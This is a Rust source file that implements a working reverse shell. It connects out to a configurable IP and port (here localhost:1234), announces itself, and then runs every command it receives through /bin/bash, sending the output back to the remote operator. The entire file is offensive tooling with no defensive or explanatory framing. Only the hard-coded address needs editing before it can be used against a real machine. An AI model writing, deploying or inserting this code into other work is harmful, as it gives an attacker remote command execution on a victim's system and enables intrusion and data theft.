use std::io::{Read, Write};
use std::net::{
    IpAddr,
    Ipv4Addr,
    SocketAddr,
    TcpStream
};
use std::process::Command;

fn main() {
    // Target IP
    let target_ip = IpAddr::V4(
        Ipv4Addr::new(127, 0, 0, 1)
    );

    // Target Port
    let target_port: u16 = 1234;

    // Create Socket
    let socket = SocketAddr::new(target_ip, target_port);

    // Bind socket
    let mut tcpstream = TcpStream::connect(socket)
        .expect(":: [-] :: Cannot bind socket");

    // Send initial message
    let msg = b":: [i] :: Incoming reverse shell\n> ";
    tcpstream.write_all(msg)
        .expect(":: [-] :: Write stream");

    loop {
        println!(":: [i] :: Waiting for incoming data");

        // Create buffer
        let mut buffer = [0; 1024];

        // Read TcpStream
        match tcpstream.read(&mut buffer) {
            Ok(0) => {
                // Exit 0 recieved bytes
                eprintln!(":: [-] :: Connection closed by peer");
                std::process::exit(1);
            }
            Ok(bytes_read) => {
                // Convert bytes to String
                let incoming = String::from_utf8_lossy(&buffer[..bytes_read]);
                let cmd = incoming.trim();
                println!(":: [i] :: Incoming data :: {cmd}");

                // Execute command and arguments
                let output = Command::new("/bin/bash")
                    .arg("-c")
                    .arg(cmd)
                    .output()
                    .expect(":: [-] :: Execute command");

                // Convert ouptut to String
                let mut response = String::from_utf8_lossy(&output.stdout).to_string();

                // Push cmd line
                response.push_str("> ");

                // Write response to TcpStream
                if let Err(err) = tcpstream.write_all(response.as_bytes()) {
                    eprintln!(":: [-] :: Write stream :: {err}");
                }

                // Flush output stream
                tcpstream.flush().expect(":: [-] :: Flush stream");
            }
            Err(err) => {
                eprintln!(":: [-] :: Read stream :: {err}");
            }
        }
    }
}
